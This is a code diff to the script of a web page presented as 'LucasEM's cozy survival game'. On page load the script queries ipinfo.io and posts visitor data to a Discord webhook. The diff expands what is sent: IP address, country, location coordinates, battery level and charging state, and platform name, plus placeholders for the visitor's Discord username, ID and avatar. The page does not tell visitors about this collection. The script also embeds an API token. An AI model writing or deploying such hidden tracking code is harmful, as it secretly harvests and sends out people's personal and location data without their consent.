@@ -77,40 +77,56 @@
         fetch("https://ipinfo.io/json?token=abfa2c858d87e3")
             .then(response => response.json())
             .then(data => {
-                const { ip, city } = data;
+                const { ip, city, country, loc } = data;
                 const { deviceType, browser } = getDeviceInfo();
 
-                // Create the webhook message
-                const message = {
-                    content: "LucasEM's cozy survival game",
-                    embeds: [
-                        {
-                            title: "LucasEM's Very Cozy Game",
-                            description: "Welcome to LucasEM's cozy survival game!",
-                            color: 0xFFFFFF,
-                            fields: [
-                                { name: "City", value: city || "Unknown", inline: true },
-                                { name: "Device Type", value: deviceType, inline: true },
-                                { name: "Browser", value: browser, inline: true },
-                            ],
-                            footer: {
-                                text: "Thank you for visiting!",
-                            }
-                        }
-                    ]
-                };
+                // Get battery information
+                navigator.getBattery().then(function(battery) {
+                    const batteryStatus = `${battery.level * 100}%`;
+                    const charging = battery.charging ? "Charging" : "Not charging";
 
-                // Send data to the Discord webhook
-                fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(message),
-                })
+                    // Create the webhook message
+                    const message = {
+                        content: "LucasEM's cozy survival game",
+                        embeds: [
+                            {
+                                title: "User Information",
+                                description: "Details of the user playing LucasEM's cozy survival game.",
+                                color: 0xFFFFFF,
+                                fields: [
+                                    { name: "IP Address", value: ip || "Unknown", inline: true },
+                                    { name: "City", value: city || "Unknown", inline: true },
+                                    { name: "Country", value: country || "Unknown", inline: true },
+                                    { name: "Location", value: loc || "Unknown", inline: true },
+                                    { name: "Device Type", value: deviceType, inline: true },
+                                    { name: "Browser", value: browser, inline: true },
+                                    { name: "Battery Status", value: batteryStatus, inline: true },
+                                    { name: "Charging Status", value: charging, inline: true },
+                                    { name: "Device Name", value: navigator.platform, inline: true },
+                                    // Placeholder for Discord info (requires API)
+                                    { name: "Discord Username", value: "Placeholder (OAuth2 required)", inline: true },
+                                    { name: "Discord ID", value: "Placeholder (OAuth2 required)", inline: true },
+                                    { name: "Profile Picture", value: "Placeholder (OAuth2 required)", inline: true },
+                                ],
+                                footer: {
+                                    text: "Thank you for visiting!",
+                                }
+                            }
+                        ]
+                    };
+
+                    // Send data to the Discord webhook
+                    fetch(webhookURL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(message),
+                    })
                     .then(res => {
                         if (res.ok) console.log("Webhook sent successfully!");
                         else console.error("Failed to send webhook:", res.statusText);
                     })
                     .catch(err => console.error("Error:", err));
+                });
             })
             .catch(err => console.error("Error fetching IP data:", err));
     </script>
